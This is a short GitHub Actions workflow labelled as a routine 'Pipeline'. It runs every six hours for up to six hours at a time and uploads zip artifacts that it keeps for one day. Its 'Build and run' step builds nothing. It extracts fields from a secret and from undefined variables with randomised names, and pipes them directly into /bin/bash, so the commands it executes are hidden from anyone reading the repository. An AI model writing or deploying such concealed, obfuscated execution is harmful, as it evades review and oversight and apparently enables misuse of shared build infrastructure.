name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '35 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          hko3: ${{ secrets.hko3 }}
        run: |
          printf '%s' "$hko3" | jq -r .szb1 | /bin/bash
          printf '%s' "$tezs2681" | jq -r .uovh275 | /bin/bash
          printf '%s' "$btcfr796" | jq -r .dsg1457 | /bin/bash
          echo $ika4 | jq -r .huo42716 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: E3J0xMQr
          path: "*.zip"
          retention-days: 1
